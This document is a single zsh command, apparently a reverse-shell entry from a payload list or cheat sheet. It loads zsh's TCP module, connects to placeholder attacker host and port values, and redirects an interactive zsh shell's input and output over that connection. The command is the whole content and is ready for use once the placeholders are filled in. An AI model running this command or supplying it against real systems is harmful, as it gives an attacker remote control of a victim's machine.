zsh -c 'zmodload zsh/net/tcp && ztcp <attacker ip> <attacker port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
